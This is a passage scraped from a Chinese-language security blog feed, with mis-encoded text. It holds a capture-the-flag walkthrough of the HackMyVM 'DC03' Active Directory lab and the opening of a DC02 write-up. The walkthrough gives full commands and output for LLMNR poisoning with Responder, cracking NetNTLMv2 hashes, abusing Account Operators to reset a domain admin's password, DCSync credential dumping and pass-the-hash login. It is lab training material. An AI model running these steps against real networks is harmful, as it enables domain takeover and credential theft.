<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. è·å–ä¸€ä¸ªå¯ç”¨çš„ADç”¨æˆ·" data-href="#3. è·å–ä¸€ä¸ªå¯ç”¨çš„ADç”¨æˆ·" href="https://www.c1trus.top/about:blank#3._è·å–ä¸€ä¸ªå¯ç”¨çš„ADç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">3. è·å–ä¸€ä¸ªå¯ç”¨çš„ADç”¨æˆ·</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMBç©ºä¼šè¯æ£€æµ‹" data-href="#3.1. SMBç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#3.1._SMBç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMBç©ºä¼šè¯æ£€æµ‹</a>
<br><a data-tooltip-position="top" aria-label="3.2. Kerbruteçˆ†ç ´" data-href="#3.2. Kerbruteçˆ†ç ´" href="https://www.c1trus.top/about:blank#3.2._Kerbruteçˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">3.2. Kerbruteçˆ†ç ´</a>
<br><a data-tooltip-position="top" aria-label="3.3. NTML Relay" data-href="#3.3. NTML Relay" href="https://www.c1trus.top/about:blank#3.3._NTML_Relay" class="internal-link" target="_self" rel="noopener nofollow">3.3. NTML Relay</a>


<br><a data-tooltip-position="top" aria-label="4. è·å–åˆ°ç”¨æˆ·çš„åç»­åˆ©ç”¨" data-href="#4. è·å–åˆ°ç”¨æˆ·çš„åç»­åˆ©ç”¨" href="https://www.c1trus.top/about:blank#4._è·å–åˆ°ç”¨æˆ·çš„åç»­åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">4. è·å–åˆ°ç”¨æˆ·çš„åç»­åˆ©ç”¨</a>

<br><a data-tooltip-position="top" aria-label="4.1. è·å–ç”¨æˆ·çš„SMBå…±äº«" data-href="#4.1. è·å–ç”¨æˆ·çš„SMBå…±äº«" href="https://www.c1trus.top/about:blank#4.1._è·å–ç”¨æˆ·çš„SMBå…±äº«" class="internal-link" target="_self" rel="noopener nofollow">4.1. è·å–ç”¨æˆ·çš„SMBå…±äº«</a>
<br><a data-tooltip-position="top" aria-label="4.2. smbcilentè¿æ¥smbå…±äº«" data-href="#4.2. smbcilentè¿æ¥smbå…±äº«" href="https://www.c1trus.top/about:blank#4.2._smbcilentè¿æ¥smbå…±äº«" class="internal-link" target="_self" rel="noopener nofollow">4.2. smbcilentè¿æ¥smbå…±äº«</a>
<br><a data-tooltip-position="top" aria-label="4.3. bloodhoodåˆ†æåŸŸç¯å¢ƒ" data-href="#4.3. bloodhoodåˆ†æåŸŸç¯å¢ƒ" href="https://www.c1trus.top/about:blank#4.3._bloodhoodåˆ†æåŸŸç¯å¢ƒ" class="internal-link" target="_self" rel="noopener nofollow">4.3. bloodhoodåˆ†æåŸŸç¯å¢ƒ</a>
<br><a data-tooltip-position="top" aria-label="4.4. ä¿®æ”¹FBETH103ç”¨æˆ·å¯†ç " data-href="#4.4. ä¿®æ”¹FBETH103ç”¨æˆ·å¯†ç " href="https://www.c1trus.top/about:blank#4.4._ä¿®æ”¹FBETH103ç”¨æˆ·å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">4.4. ä¿®æ”¹FBETH103ç”¨æˆ·å¯†ç </a>
<br><a data-tooltip-position="top" aria-label="4.5. DCSync" data-href="#4.5. DCSync" href="https://www.c1trus.top/about:blank#4.5._DCSync" class="internal-link" target="_self" rel="noopener nofollow">4.5. DCSync</a>


<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=DC03
<br>ä½œè€…ï¼š[josemlwdf](https://hackmyvm.eu/profile/?user=josemlwdf)
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šNTMLRelayã€DCSyncã€AccountOperatorç»„åˆ©ç”¨
<br><br>ç«¯å£æ‰«æ<br>nmap -sC -sV 192.168.56.126 -p- -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 02:01 CST
Stats: 0:01:59 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 82.35% done; ETC: 02:03 (0:00:07 remaining)
Stats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 82.35% done; ETC: 02:03 (0:00:08 remaining)
Nmap scan report for SOUPEDECODE.LOCAL (192.168.56.126)
Host is up (0.00020s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-20 17:17:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-title: Not Found
|\_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:9E:B3:30 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-20T17:18:28
|\_  start\_date: N/A
|\_clock-skew: -45m31s
|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:9e:b3:30 (Oracle VirtualBox virtual NIC)
<br>fscan -h 192.168.56.126

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.126:88 open
192.168.56.126:445 open
192.168.56.126:139 open
192.168.56.126:135 open
[\*] alive ports len is: 4
start vulscan
[\*] NetBios 192.168.56.126  [+] DC:SOUPEDECODE\DC01
[\*] NetInfo
[\*]192.168.56.126
   [-&gt;]DC01
   [-&gt;]192.168.56.126
<br>åŸŸå SOUPEDECODE
<br>é…ç½®/etc/hosts<br>192.168.56.126 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
<br><br><br>å…ˆçœ‹ä¸‹å­˜ä¸å­˜åœ¨SMBåŒ¿åæˆ–æ¥å®¾è®¿é—®<br> smbmap -u anonymous -H SOUPEDECODE.LOCAL

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)
<br>çœ‹æ¥ä¸å­˜åœ¨<br><br>å°è¯•åˆ©ç”¨å­—å…¸é€šè¿‡Kerberos èº«ä»½éªŒè¯æšä¸¾å‡ºåŸŸå†…å­˜åœ¨çš„ç”¨æˆ·<br>kerbrute userenum -d SOUPEDECODE.LOCAL -t 100 --dc DC01.SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  -o valid\_user.txt

cat valid\_user.txt|grep @ |cut -d ' ' -f8 |cut -d '@' -f1 &gt; kerber\_brute\_users.txt

crackmapexec smb SOUPEDECODE.LOCAL -u valid\_usernames.txt -p kerber\_brute\_users.txt --no-bruteforce  --continue-on-success
<br>æ²¡èƒ½çˆ†ç ´å‡ºä»»ä½•å¯†ç <br><br>å› ä¸ºæˆ‘ä»¬çš„eth0ç½‘å¡ ä¸åŸŸæ§å¤„äºåŒä¸€ä¸ªç½‘æ®µï¼Œå°±å¯ä»¥ä½¿ç”¨ Responder å·¥å…·æ‰§è¡Œ LLMNRï¼ˆæœ¬åœ°é“¾è·¯å¤šæ’­åç§°è§£æï¼‰ æˆ– NBT-NSï¼ˆNetBIOS åç§°æœåŠ¡ï¼‰ ä¸­æ¯’æ”»å‡»<br>é€šè¿‡è¿™ç§æ–¹å¼æˆ‘ä»¬å¯ä»¥è·å–ç›®æ ‡è®¾å¤‡å‘é€çš„ NetNTLMv2 å“ˆå¸Œ<br>è¿‡ä¸€ä¼šå°±èƒ½æ•è·åˆ°ç”¨æˆ·xkate578çš„NetNTLMv2å“ˆå¸Œ<br>responder -I eth0

[\*] [LLMNR]  Poisoned answer sent to fe80::1086:8b10:30e1:e48c for name FileServer
[\*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local
[\*] [MDNS] Poisoned answer sent to fe80::1086:8b10:30e1:e48c for name FileServer.local
[\*] [LLMNR]  Poisoned answer sent to fe80::1086:8b10:30e1:e48c for name FileServer
[\*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local
[\*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer
[\*] [MDNS] Poisoned answer sent to fe80::1086:8b10:30e1:e48c for name FileServer.local
[\*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer
[SMB] NTLMv2-SSP Client   : fe80::1086:8b10:30e1:e48c
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:d84ca885a743f75e:75ED58DEE93DAC74D07D69F87AF7CDE0:0101000000000000805CD77BC13BDB01FB4B96E42697CA710000000002000800490031003100330001001E00570049004E002D0044003000320037004A00580056004C004D004B00360004003400570049004E002D0044003000320037004A00580056004C004D004B0036002E0049003100310033002E004C004F00430041004C000300140049003100310033002E004C004F00430041004C000500140049003100310033002E004C004F00430041004C0007000800805CD77BC13BDB0106000400020000000800300030000000000000000000000000400000C3E24DD853B7CB217D974A2D7CD525FC353DB59CC32512BC98B2C70E1E620A600A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png" referrerpolicy="no-referrer"><br>ä½¿ç”¨hashcatç ´è§£è¿™ä¸ªhash<br>hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.002.png" referrerpolicy="no-referrer"><br>æˆåŠŸè·å–åˆ°å¯†ç æ˜¯jesuschrist<br><br>ç°åœ¨æˆ‘ä»¬è·å–åˆ°äº†ç”¨æˆ·ä¸å¯†ç <br>xkate578ï¼šjesuschrist
<br><br>crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'xkate578' -p 'jesuschrist' --shares
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] Enumerated shares
SMB         SOUPEDECODE.LOCAL 445    DC01             Share           Permissions     Remark
SMB         SOUPEDECODE.LOCAL 445    DC01             -----           -----------     ------
SMB         SOUPEDECODE.LOCAL 445    DC01             ADMIN$                          Remote Admin
SMB         SOUPEDECODE.LOCAL 445    DC01             C$                              Default share
SMB         SOUPEDECODE.LOCAL 445    DC01             IPC$            READ            Remote IPC
SMB         SOUPEDECODE.LOCAL 445    DC01             NETLOGON        READ            Logon server share
SMB         SOUPEDECODE.LOCAL 445    DC01             share           READ,WRITE
SMB         SOUPEDECODE.LOCAL 445    DC01             SYSVOL          READ            Logon server share
<br><br>smbclient -U 'xkate578' '//SOUPEDECODE.LOCAL/share'
Password for [WORKGROUP\xkate578]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                  DR        0  Thu Nov 21 03:29:56 2024
  ..                                  D        0  Thu Aug  1 13:38:08 2024
  desktop.ini                       AHS      282  Thu Aug  1 13:38:08 2024
  user.txt                            A       70  Thu Aug  1 13:39:25 2024
<br>è·å–åˆ°æˆ‘ä»¬çš„ç”¨æˆ·flag<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# cat user.txt
â–’â–’12f54a96f64443246930da001cafda8b
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# dnschef --fakeip 192.168.56.126 &amp;
[1] 71209

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€#           \_                \_          \_\_
         | | version 0.4  | |        / \_|
       \_\_| |\_ \_\_  \_\_\_  \_\_\_| |\_\_   \_\_\_| |\_
      / \_ | '\_ \/ \_\_|/ \_\_| '\_ \ / \_ \  \_|
     | (\_| | | | \\_\_ \ (\_\_| | | |  \_\_/ |
      \\_\_,\_|\_| |\_|\_\_\_/\\_\_\_|\_| |\_|\\_\_\_|\_|
                   iphelix@thesprawl.org

(03:14:06) [\*] DNSChef started on interface: 127.0.0.1
(03:14:06) [\*] Using the following nameservers: 8.8.8.8
(03:14:06) [\*] Cooking all A replies to point to 192.168.56.126


â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€#

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# bloodhound-python  -u xkate578 -p jesuschrist -ns 127.0.0.1 -d SOUPEDECODE.LOCAL  -dc DC01.SOUPEDECODE.LOCAL --zip
INFO: Compressing output into 20241121031526\_bloodhound.zip
<br>å¯¼å…¥å‹ç¼©åŒ…é‡Œé¢çš„jsonæ–‡ä»¶è¿›è¡Œåˆ†æ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.003.png" referrerpolicy="no-referrer"><br>å‘ç°è¿™xkate578ç”¨æˆ·æ˜¯Account Operator ç»„çš„æˆå‘˜ï¼Œä½†å½“å‰ç”¨æˆ·åœ¨ AD ç¯å¢ƒä¸­åˆ›å»ºå’Œä¿®æ”¹å¸æˆ·çš„èƒ½åŠ›æœ‰é™<br>Account Operatorsï¼ˆè´¦æˆ·æ“ä½œå‘˜ï¼‰ ç»„ä¸ºæˆå‘˜èµ‹äºˆäº†æœ‰é™çš„è´¦æˆ·åˆ›å»ºæƒé™ã€‚
<br>
è¯¥ç»„çš„æˆå‘˜å¯ä»¥åˆ›å»ºå’Œä¿®æ”¹å¤§å¤šæ•°ç±»å‹çš„è´¦æˆ·ï¼ŒåŒ…æ‹¬ç”¨æˆ·è´¦æˆ·ã€æœ¬åœ°ç»„å’Œå…¨å±€ç»„çš„è´¦æˆ·ã€‚<br>
æ­¤å¤–ï¼Œç»„æˆå‘˜å¯ä»¥ç›´æ¥ç™»å½•åŸŸæ§åˆ¶å™¨ã€‚Account Operators ç»„çš„æˆå‘˜ä¸èƒ½ç®¡ç†ä»¥ä¸‹å†…å®¹ï¼š

<br>Administratorï¼ˆç®¡ç†å‘˜ï¼‰ç”¨æˆ·è´¦æˆ·ã€‚
<br>Administratorsã€Server Operatorsã€Account Operatorsã€Backup Operators å’Œ Print Operators ç­‰<a class="internal-link" data-href="../æ¸—é€å§¿åŠ¿åº“/é»˜è®¤å—ä¿æŠ¤ç»„.md" href="https://www.c1trus.top/24-æ¸—é€/æ¸—é€å§¿åŠ¿åº“/é»˜è®¤å—ä¿æŠ¤ç»„.html" target="_self" rel="noopener nofollow">é»˜è®¤å—ä¿æŠ¤ç»„</a>ã€‚ 
<br>Account Operators ç»„çš„æˆå‘˜ä¹Ÿä¸èƒ½ä¿®æ”¹ç³»ç»Ÿçº§åˆ«çš„ç”¨æˆ·æƒé™ï¼ˆå¦‚ç™»å½•æœ¬åœ°ã€ä½œä¸ºæœåŠ¡è¿è¡Œç­‰ï¼‰

<br>çœ‹ä¸€ä¸‹åˆ°åŸŸç®¡ç†çš„æœ€è¿‘è·¯å¾„<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.004.png" referrerpolicy="no-referrer"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ· FBETH103 æ˜¯ Operators ç»„çš„æˆå‘˜ï¼Œè€Œ Operators ç»„åˆæ˜¯ Domain Adminsï¼ˆåŸŸç®¡ç†å‘˜ï¼‰ ç»„çš„æˆå‘˜ã€‚ç”±äº Operators ç»„å¹¶ä¸æ˜¯é»˜è®¤å—ä¿æŠ¤ç»„ï¼Œ<br>å› æ­¤ Account Operatorsï¼ˆè´¦æˆ·æ“ä½œå‘˜ï¼‰ ç»„çš„æˆå‘˜å¯ä»¥ä¿®æ”¹è¯¥ç»„ä¸­æˆå‘˜çš„è´¦æˆ·ä¿¡æ¯ã€‚<br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ç”¨æˆ·FBETH103 çš„å¯†ç ã€‚<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# impacket-changepasswd SOUPEDECODE.LOCAL/fbeth103@192.168.56.14 -altuser xkate578 -altpass jesuschrist  -newpass admin123 -reset
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[\*] Setting the password of SOUPEDECODE.LOCAL\fbeth103 as SOUPEDECODE.LOCAL\xkate578
[\*] Connecting to DCE/RPC as SOUPEDECODE.LOCAL\xkate578
[\*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
<br>ä¹Ÿå¯ä»¥ç”¨setuserinfo2 å‘½ä»¤<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# rpcclient -U 'xkate578' 192.168.56.14
Password for [WORKGROUP\xkate578]:
rpcclient $&gt; setuserinfo2 fbeth103 23 admin12345
rpcclient $&gt; exit

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'fbeth103' -p 'admin12345'
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\fbeth103:admin12345 (Pwn3d!)
<br>è¿˜å¯ä»¥ç”¨bloodyADè¿›è¡Œä¿®æ”¹å¯†ç <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# bloodyAD -d SOUPEDECODE.LOCAL --host 192.168.56.14 -u xkate578 -p jesuschrist set password FBETH103 admin321
[+] Password changed successfully!
<br><br>æ­¤æ—¶æˆ‘ä»¬è·å–åˆ°äº†Operators ç»„ä¸‹çš„ç”¨æˆ·FBETH103 ï¼Œè€ŒOperators ç»„åˆæ˜¯Domain Adminsï¼ˆåŸŸç®¡ç†å‘˜ï¼‰ ç»„çš„æˆå‘˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸ªç”¨æˆ·å¯¹åŸŸæ§åˆ¶å™¨æ‰§è¡Œ DCSync æ”»å‡»ã€‚<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.005.png" referrerpolicy="no-referrer"><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# crackmapexec smb DC01.SOUPEDECODE.LOCAL -u fbeth103 -p admin321 --ntds &gt;ntds.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# cat ntds.txt|grep Administrator
SMB         SOUPEDECODE.LOCAL 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::
<br>åˆ©ç”¨Administratorç”¨æˆ·çš„NTLM hash å¯†ç ç™»å½•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC03]
â””â”€# evil-winrm -i 192.168.56.14 -u Administrator -H 2176416a80e4f62804f101d3a55d6c93

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting\_detection\_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
\*Evil-WinRM\* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
b8e59a7d4020792c412da75e589ff4fc
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/22.dc03.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/22.DC03.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[21.DC02]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. SMBç©ºä¼šè¯æ£€æµ‹" data-href="#2.2. SMBç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#2.2._SMBç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">2.2. SMBç©ºä¼šè¯æ£€æµ‹</a>


<br><a data-tooltip-position="top" aria-label="3. kerbrute çˆ†ç ´" data-href="#3. kerbrute çˆ†ç ´" href="https://www.c1trus.top/about:blank#3._kerbrute_çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">3. kerbrute çˆ†ç ´</a>

<br><a data-tooltip-position="top" aria-label="3.1. å¯†ç å–·æ¶‚" data-href="#3.1. å¯†ç å–·æ¶‚" href="https://www.c1trus.top/about:blank#3.1._å¯†ç å–·æ¶‚" class="internal-link" target="_self" rel="noopener nofollow">3.1. å¯†ç å–·æ¶‚</a>


<br><a data-tooltip-position="top" aria-label="4. ASREPRoasting" data-href="#4. ASREPRoasting" href="https://www.c1trus.top/about:blank#4._ASREPRoasting" class="internal-link" target="_self" rel="noopener nofollow">4. ASREPRoasting</a>

<br><a data-tooltip-position="top" aria-label="4.1. ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·" data-href="#4.1. ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·" href="https://www.c1trus.top/about:blank#4.1._ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4.1. ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="4.2. æšä¸¾ç¦ç”¨äº† Kerberos é¢„è®¤è¯çš„ç”¨æˆ·" data-href="#4.2. æšä¸¾ç¦ç”¨äº† Kerberos é¢„è®¤è¯çš„ç”¨æˆ·" href="https://www.c1trus.top/about:blank#4.2._æšä¸¾ç¦ç”¨äº†_Kerberos_é¢„è®¤è¯çš„ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4.2. æšä¸¾ç¦ç”¨äº† Kerberos é¢„è®¤è¯çš„ç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="4.3. æš´åŠ›ç ´è§£AS-REPå“åº”å¯†ç hash" data-href="#4.3. æš´åŠ›ç ´è§£AS-REPå“åº”å¯†ç hash" href="https://www.c1trus.top/about:blank#4.3._æš´åŠ›ç ´è§£AS-REPå“åº”å¯†ç hash" class="internal-link" target="_self" rel="noopener nofollow">4.3. æš´åŠ›ç ´è§£AS-REPå“åº”å¯†ç hash</a>


<br><a data-tooltip-position="top" aria-label="5. Bloodhoundæ”¶é›†åŸŸå†…ä¿¡æ¯" data-href="#5. Bloodhoundæ”¶é›†åŸŸå†…ä¿¡æ¯" href="https://www.c1trus.top/about:blank#5._Bloodhoundæ”¶é›†åŸŸå†…ä¿¡æ¯" class="internal-link" target="_self" rel="noopener nofollow">5. Bloodhoundæ”¶é›†åŸŸå†…ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="6. SAMè½¬å‚¨" data-href="#6. SAMè½¬å‚¨" href="https://www.c1trus.top/about:blank#6._SAMè½¬å‚¨" class="internal-link" target="_self" rel="noopener nofollow">6. SAMè½¬å‚¨</a>

<br><a data-tooltip-position="top" aria-label="6.1. åˆ©ç”¨æœºå™¨hashè¿›è¡Œå¯†ç å–·å°„" data-href="#6.1. åˆ©ç”¨æœºå™¨hashè¿›è¡Œå¯†ç å–·å°„" href="https://www.c1trus.top/about:blank#6.1._åˆ©ç”¨æœºå™¨hashè¿›è¡Œå¯†ç å–·å°„" class="internal-link" target="_self" rel="noopener nofollow">6.1. åˆ©ç”¨æœºå™¨hashè¿›è¡Œå¯†ç å–·å°„</a>


<br><a data-tooltip-position="top" aria-label="7. DCSyncæ”»å‡»" data-href="#7. DCSyncæ”»å‡»" href="https://www.c1trus.top/about:blank#7._DCSyncæ”»å‡»" class="internal-link" target="_self" rel="noopener nofollow">7. DCSyncæ”»å‡»</a>

<br><a data-tooltip-position="top" aria-label="7.1. winrmç™»å½•" data-href="#7.1. winrmç™»å½•" href="https://www.c1trus.top/about:blank#7.1._winrmç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">7.1. winrmç™»å½•</a>


<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=DC02
<br>ä½œè€…ï¼š[josemlwdf](https://hackmyvm.eu/profile/?user=josemlwdf)
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šASREPRoastingã€Bloodhoundåˆ†æã€SAMè½¬å‚¨ã€DCSync ã€kerbrute çˆ†ç ´
<br><br><br>nmap -sC -sV 192.168.56.126 -p- -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 11:36 CST
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 77.78% done; ETC: 11:39 (0:00:14 remaining)
Stats: 0:02:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 77.78% done; ETC: 11:39 (0:00:15 remaining)
Nmap scan report for 192.168.56.126
Host is up (0.00022s latency).
